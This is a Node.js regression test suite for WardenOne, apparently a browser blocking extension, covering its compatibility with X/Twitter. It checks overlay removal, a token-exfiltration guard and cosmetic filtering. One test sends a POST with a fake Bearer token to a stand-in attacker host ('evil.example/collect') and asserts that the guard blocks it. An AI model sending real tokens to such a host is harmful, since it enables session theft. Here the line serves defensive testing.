/* WardenOne — Copyright (C) 2026 iri
   Licensed under the GNU General Public License v3 or later. See LICENSE.
   Official source: https://github.com/iri-dev/WardenOne
   Upstream filter-list attribution: CREDITS.md
   Redistributing a modified copy? GPLv3 section 5(a) requires you to mark it as changed,
   with the date, and to keep these notices intact. */
/*
 * X/Twitter compatibility regressions.
 *
 * These tests execute the relevant sections of the shipped content.min.js
 * bundle. They cover the two failure modes that previously made X unusable:
 * essential fixed UI being mistaken for a notification overlay, and
 * authenticated requests between the x.com/twitter.com/twimg.com family being
 * mistaken for token exfiltration.
 *
 * Run with:
 *   node tools/test-x-compatibility.js
 */
'use strict';

const assert = require('assert');
const fs = require('fs');
const path = require('path');
const vm = require('vm');
/* This suite lifts a region of the engine and runs it in a hand-built sandbox, so it has to be
 * given the helpers the engine declares in its teardown preamble -- a lifted fragment cannot see
 * them otherwise. Only those helpers are supplied, not the whole preamble, so a fragment that
 * reaches for anything else it should not see still fails. */
const { installEngineAmbient } = require('./lib/engine-ambient.js');

const ROOT = path.resolve(__dirname, '..');
const CONTENT = fs.readFileSync(path.join(ROOT, 'content.min.js'), 'utf8');
const BACKGROUND = fs.readFileSync(path.join(ROOT, 'background.js'), 'utf8');

const tests = [];
function test(name, fn) { tests.push({ name, fn }); }

function sourceBetween(startNeedle, endNeedle, includeStart) {
  const start = CONTENT.indexOf(startNeedle);
  assert(start >= 0, 'missing runtime marker: ' + startNeedle);
  const end = CONTENT.indexOf(endNeedle, start + startNeedle.length);
  assert(end > start, 'missing runtime marker after ' + startNeedle + ': ' + endNeedle);
  return CONTENT.slice(includeStart === false ? start + startNeedle.length : start, end);
}

function backgroundBetween(startNeedle, endNeedle, includeStart) {
  const start = BACKGROUND.indexOf(startNeedle);
  assert(start >= 0, 'missing background marker: ' + startNeedle);
  const end = BACKGROUND.indexOf(endNeedle, start + startNeedle.length);
  assert(end > start, 'missing background marker after ' + startNeedle + ': ' + endNeedle);
  return BACKGROUND.slice(includeStart === false ? start + startNeedle.length : start, end);
}

function loadCosmeticPolicy() {
  const sandbox = {
    ADSHIELD_COSMETIC_MAX: 1000,
    parseScriptlet() { return null; },
    scriptletMayBeStoredForDomains() { return false; },
    scriptletMayRunOnHost() { return true; },
    normalizeAllowlistHost(host) { return String(host || '').replace(/^www\./i, '').toLowerCase(); },
    normalizeAllowlistHosts(list) { return Array.from(list || []); },
    hostMatchesAllowlist(host, list) {
      const h = String(host || '').replace(/^www\./i, '').toLowerCase();
      return Array.from(list || []).some((d) => h === d || h.endsWith('.' + d));
    },
    isVideoPlatformHost() { return false; },
    __cosmeticHostCache: new Map(),
    COSMETIC_HOST_CACHE_MAX: 256,
    Set,
    Map,
    Array,
    Object,
    String,
  };
  vm.createContext(sandbox);
  installEngineAmbient(sandbox);
  vm.runInContext(
    backgroundBetween('function parseCosmeticFilters', '// Fetch + parse the cosmetic lists')
      + '\n'
      + backgroundBetween('function computeCosmeticForHost', '// Dynamic rule IDs live')
      + '\n'
      + backgroundBetween('function isXPlatformHost', 'function isSafeVideoPlatformCosmeticSelector')
      + '\nthis.__api={parseCosmeticFilters,computeCosmeticForHost};',
    sandbox,
    { filename: 'background.js:x-cosmetic-compatibility' },
  );
  return sandbox.__api;
}

function loadLearnedDomainPolicy() {
  const familyMatch = BACKGROUND.match(/const\s+X_APP_COMPAT_DOMAINS\s*=\s*new Set\((\[[\s\S]*?\])\);/);
  assert(familyMatch, 'missing X app compatibility-domain set');
  const sandbox = {
    X_APP_COMPAT_DOMAINS: new Set(vm.runInNewContext(familyMatch[1])),
    normalizeAllowlistHost(host) { return String(host || '').replace(/^www\./, '').toLowerCase(); },
    registrableDomainBg(host) {
      const labels = String(host || '').replace(/^www\./, '').toLowerCase().split('.').filter(Boolean);
      return labels.length > 1 ? labels.slice(-2).join('.') : labels[0] || '';
    },
    isNeverBlockDomain() { return false; },
  };
  vm.createContext(sandbox);
  installEngineAmbient(sandbox);
  vm.runInContext(
    backgroundBetween('function normalizeLearnedDomain', 'function loadLearned')
      + '\nthis.__normalize=normalizeLearnedDomain;',
    sandbox,
    { filename: 'background.js:x-learned-domain-compatibility' },
  );
  return sandbox.__normalize;
}

function makeStyle(initial) {
  const values = Object.assign({}, initial || {});
  const priorities = Object.create(null);
  return {
    setProperty(name, value, priority) {
      values[name] = String(value);
      priorities[name] = String(priority || '');
    },
    getPropertyValue(name) { return values[name] || ''; },
    getPropertyPriority(name) { return priorities[name] || ''; },
    removeProperty(name) {
      const old = values[name] || '';
      delete values[name];
      delete priorities[name];
      return old;
    },
  };
}

function makeControl(text) {
  return {
    tagName: 'BUTTON',
    innerText: text,
    textContent: text,
    value: '',
    getAttribute() { return null; },
  };
}

function makeSurface(options) {
  const attrs = Object.assign({}, options.attrs || {});
  const controls = options.controls || [];
  const style = makeStyle();
  return {
    nodeType: 1,
    tagName: String(options.tag || 'DIV').toUpperCase(),
    id: options.id || '',
    className: options.className || '',
    innerText: options.text || '',
    textContent: options.text || '',
    parentElement: null,
    style,
    __computed: Object.assign({
      position: 'fixed',
      zIndex: '20',
      display: 'block',
      visibility: 'visible',
      opacity: '1',
      borderRadius: '0px',
      borderTopLeftRadius: '0px',
      borderTopRightRadius: '0px',
      borderBottomLeftRadius: '0px',
      borderBottomRightRadius: '0px',
      backgroundColor: 'rgb(255, 255, 255)',
      cursor: 'default',
    }, options.computed || {}),
    getBoundingClientRect() { return Object.assign({}, options.rect); },
    getAttribute(name) { return attrs[name] == null ? null : attrs[name]; },
    hasAttribute(name) { return attrs[name] != null; },
    querySelector(selector) {
      if (/input\[type="password"\]|autocomplete="current-password"|autocomplete="new-password"/.test(selector)) {
        return options.passwordInput || null;
      }
      if (/input\[type="email"\]|autocomplete="username"|autocomplete="email"/.test(selector)) {
        return options.usernameInput || null;
      }
      return null;
    },
    querySelectorAll(selector) {
      return /button|role="button"|a\[href\]|input\[type="submit"\]/.test(selector) ? controls : [];
    },
    closest() { return null; },
    matches() { return false; },
  };
}

function runOverlayProbe(pageUrl, surface) {
  const logs = [];
  const injectedStyles = [];
  const rootStyle = makeStyle();
  const documentElement = {
    nodeType: 1,
    tagName: 'HTML',
    style: rootStyle,
    appendChild(node) { injectedStyles.push(node); return node; },
  };
  const candidateSelectorPrefix = 'div,section,aside,a,button,span,i,svg,img,canvas';
  const document = {
    readyState: 'complete',
    body: null,
    head: { appendChild(node) { injectedStyles.push(node); return node; } },
    documentElement,
    getElementById() { return null; },
    createElement(tag) {
      return { tagName: String(tag).toUpperCase(), id: '', textContent: '', style: makeStyle() };
    },
    createComment() { return { nodeType: 8, parentNode: null }; },
    querySelectorAll(selector) {
      if (String(selector).startsWith(candidateSelectorPrefix)) return [surface];
      return [];
    },
    addEventListener() {},
  };
  const url = new URL(pageUrl);
  const sandbox = {
    URL,
    Date,
    Math,
    Set,
    WeakSet,
    Array,
    Object,
    String,
    document,
    location: {
      href: url.href,
      hostname: url.hostname,
      pathname: url.pathname,
    },
    innerWidth: 1280,
    innerHeight: 800,
    WO: {
      removeOverlays: true,
      autoSkipDownloadAds: false,
      showDownloadBar: false,
      blockSearchAiAnswers: false,
      blockSponsoredSearchResults: false,
      googleSearchResultCleanup: false,
      __overlaysDone: false,
    },
    isGoogleSearchResults: () => false,
    getComputedStyle(node) { return node && node.__computed ? node.__computed : {
      position: 'static', zIndex: '0', display: 'block', visibility: 'visible', opacity: '1',
    }; },
    log(type, detail) { logs.push({ type, detail }); },
    setTimeout() { return 1; },
    clearTimeout() {},
    requestAnimationFrame(fn) { if (typeof fn === 'function') fn(); return 1; },
    MutationObserver: class MutationObserver {
      observe() {}
      disconnect() {}
    },
    // Helpers are only needed if a regression reaches one of the UI branches.
    S() {},
    clearNode() {},
    appendShieldSvg() {},
  };
  sandbox.window = sandbox;
  vm.createContext(sandbox);
  installEngineAmbient(sandbox);
  /* End marker is an address, not an assertion -- it moved when the engine routed its listeners
     through woOn so teardown could release them. */
  const overlayRuntime = sourceBetween(
    'if(WO.removeOverlays',
    'try{woOn(window,"keydown"',
  );
  vm.runInContext(overlayRuntime, sandbox, { filename: 'content.min.js:x-overlay-compatibility' });
  return { logs, injectedStyles, surface };
}

function emptyStorage() {
  return {
    length: 0,
    key() { return null; },
    getItem() { return null; },
  };
}

function installSessionShield(pageUrl) {
  const nativeFetchCalls = [];
  const logs = [];
  const url = new URL(pageUrl);
  const sandbox = {
    URL,
    URLSearchParams,
    Headers,
    FormData,
    ArrayBuffer,
    TextDecoder,
    Blob,
    Object,
    Array,
    Set,
    WeakSet,
    JSON,
    String,
    Date,
    Promise,
    DOMException,
    btoa(value) { return Buffer.from(String(value), 'binary').toString('base64'); },
    location: { href: url.href, hostname: url.hostname },
    localStorage: emptyStorage(),
    sessionStorage: emptyStorage(),
    document: { cookie: '' },
    navigator: { sendBeacon() { return true; } },
    WO: {
      blockTokenExfil: true,
      continuousTokenScan: false,
      detectSkimmers: false,
      paymentCardGuard: false,
    },
    // Match the helper used by the shipped runtime. Its exact-host behavior is
    // why the explicit X family is required for api./upload./pbs. subdomains.
    regDomain(host) { return String(host || '').replace(/^www\./, '').toLowerCase(); },
    log(type, detail) { logs.push({ type, detail }); },
    fetch(input, init) {
      nativeFetchCalls.push({ input, init });
      return Promise.resolve({ ok: true, status: 200 });
    },
  };
  sandbox.window = sandbox;
  vm.createContext(sandbox);
  installEngineAmbient(sandbox);
  const guardRuntime = sourceBetween(
    'if(WO.blockTokenExfil||WO.continuousTokenScan||WO.detectSkimmers||WO.paymentCardGuard)try{',
    'if(WO.continuousTokenScan){',
    false,
  );
  vm.runInContext('{' + guardRuntime + '}', sandbox, {
    filename: 'content.min.js:x-session-compatibility',
  });
  return { sandbox, nativeFetchCalls, logs };
}

test('X authentication and signed-in navigation surfaces stay visible', () => {
  const fixtures = [
    {
      name: 'signed-in navigation',
      surface: makeSurface({
        tag: 'div',
        text: 'Home Explore Notifications Messages Grok Bookmarks Communities Premium Profile More Post',
        rect: { left: 0, top: 0, right: 275, bottom: 800, width: 275, height: 800 },
      }),
    },
    {
      name: 'authentication panel',
      surface: makeSurface({
        tag: 'div',
        text: 'Sign up for X',
        controls: [makeControl('Create account')],
        attrs: { role: 'dialog', 'aria-modal': 'true', 'data-testid': 'sheetDialog' },
        rect: { left: 360, top: 100, right: 920, bottom: 700, width: 560, height: 600 },
      }),
    },
  ];
  for (const host of ['x.com', 'twitter.com']) {
    for (const fixture of fixtures) {
      const probe = runOverlayProbe('https://' + host + '/i/flow/login', fixture.surface);
      assert.notStrictEqual(
        fixture.surface.style.getPropertyValue('display'),
        'none',
        host + ' ' + fixture.name + ' was hidden as an overlay',
      );
      assert(!probe.logs.some((entry) => entry.type === 'blocked_overlay'),
        host + ' ' + fixture.name + ' was reported as a blocked overlay');
    }
  }
});

test('authenticated X/Twitter family fetches pass through unchanged', async () => {
  const bearer = 'Bearer ' + 'A'.repeat(48);
  const cases = [
    ['https://x.com/home', 'https://api.twitter.com/1.1/onboarding/task.json'],
    ['https://x.com/home', 'https://upload.twitter.com/i/media/upload.json'],
    ['https://x.com/home', 'https://pbs.twimg.com/media/fixture.jpg'],
    ['https://x.com/home', 'https://api.x.com/graphql/fixture/HomeTimeline'],
    ['https://twitter.com/home', 'https://api.x.com/graphql/fixture/HomeTimeline'],
  ];
  for (const [pageUrl, requestUrl] of cases) {
    const h = installSessionShield(pageUrl);
    const init = { method: 'POST', headers: { authorization: bearer }, body: '{"query":"fixture"}' };
    const response = await h.sandbox.fetch(requestUrl, init);
    assert.strictEqual(response.status, 200, requestUrl + ' did not receive the native response');
    assert.strictEqual(h.nativeFetchCalls.length, 1, requestUrl + ' did not reach native fetch exactly once');
    assert.strictEqual(h.nativeFetchCalls[0].input, requestUrl, requestUrl + ' was rewritten');
    assert.strictEqual(h.nativeFetchCalls[0].init, init, requestUrl + ' request options were replaced');
    assert(!h.logs.some((entry) => entry.type === 'blocked_token_exfil'),
      requestUrl + ' was falsely logged as token exfiltration');
  }
});

test('X family exception does not weaken foreign token-exfiltration blocking', async () => {
  const h = installSessionShield('https://x.com/home');
  let error = null;
  try {
    await h.sandbox.fetch('https://evil.example/collect', {
      method: 'POST',
      headers: { authorization: 'Bearer ' + 'B'.repeat(48) },
    });
  } catch (caught) {
    error = caught;
  }
  assert(error && error.name === 'SecurityError', 'foreign token request was not rejected');
  assert.strictEqual(h.nativeFetchCalls.length, 0, 'foreign token request reached native fetch');
  assert(h.logs.some((entry) => entry.type === 'blocked_token_exfil'),
    'foreign token request was not logged as blocked');
});

test('X honors generic-hide exceptions while retaining domain-specific cosmetics', () => {
  const policy = loadCosmeticPolicy();
  const parsed = policy.parseCosmeticFilters([
    '##.generic-ad-slot',
    'x.com##.x-promoted-content',
    '@@||x.com^$generichide',
    '@@||example.net^$script,ghide',
  ].join('\n'));
  assert(Array.from(parsed.genericHideExclusions || []).includes('x.com'),
    'parser dropped the x.com generichide exception');
  assert(Array.from(parsed.genericHideExclusions || []).includes('example.net'),
    'parser dropped a ghide modifier mixed with another option');

  const mem = { cfg: {}, allow: [], data: parsed };
  const xSelectors = Array.from(policy.computeCosmeticForHost('mobile.x.com', mem).selectors || []);
  assert(!xSelectors.includes('.generic-ad-slot'), 'generic selector leaked onto X');
  assert(xSelectors.includes('.x-promoted-content'), 'X-specific cosmetic selector was lost');

  const normalSelectors = Array.from(policy.computeCosmeticForHost('ordinary.example', mem).selectors || []);
  assert(normalSelectors.includes('.generic-ad-slot'), 'generic selectors were disabled for unrelated sites');

  const legacy = {
    cfg: {},
    allow: [],
    data: { generic: ['.legacy-generic'], specific: {}, exceptions: {}, procedural: {}, scriptlets: {} },
  };
  const legacyX = Array.from(policy.computeCosmeticForHost('x.com', legacy).selectors || []);
  assert(!legacyX.includes('.legacy-generic'), 'old cached cosmetic data can still hide X');

  const manyExceptions = Array.from({ length: 1005 }, (_, index) => 'compat-' + index + '.example');
  manyExceptions.push('late-exception.example');
  const lateException = {
    cfg: {},
    allow: [],
    data: {
      generic: ['.generic-after-one-thousand'],
      genericHideExclusions: manyExceptions,
      specific: {}, exceptions: {}, procedural: {}, scriptlets: {},
    },
  };
  const lateSelectors = Array.from(policy.computeCosmeticForHost('sub.late-exception.example', lateException).selectors || []);
  assert(!lateSelectors.includes('.generic-after-one-thousand'),
    'generic-hide exceptions after the allowlist helper cap were ignored');
});

test('general malicious-domain learning exempts only the narrow X family', () => {
  const normalize = loadLearnedDomainPolicy();
  for (const domain of ['x.com', 'api.x.com', 'twitter.com', 'pbs.twimg.com']) {
    assert.strictEqual(normalize(domain), '', 'general learner can still block ' + domain);
  }
  assert.strictEqual(normalize('tracker.evil'), 'tracker.evil',
    'unrelated suspicious domain was accidentally protected');
  assert.strictEqual(normalize('portal.example.edu'), 'example.edu',
    'education domains were broadly exempted from malicious-domain learning');
  assert.strictEqual(normalize('service.example.gov'), 'example.gov',
    'government domains were broadly exempted from malicious-domain learning');
});

void (async () => {
  let failures = 0;
  for (const item of tests) {
    try {
      await item.fn();
      console.log('ok - ' + item.name);
    } catch (error) {
      failures++;
      console.error('not ok - ' + item.name);
      console.error(error && error.stack ? error.stack : error);
    }
  }
  if (failures) process.exitCode = 1;
  else console.log('\n' + tests.length + ' X/Twitter compatibility tests passed.');
})().catch((error) => {
  console.error(error && error.stack ? error.stack : error);
  process.exitCode = 1;
});
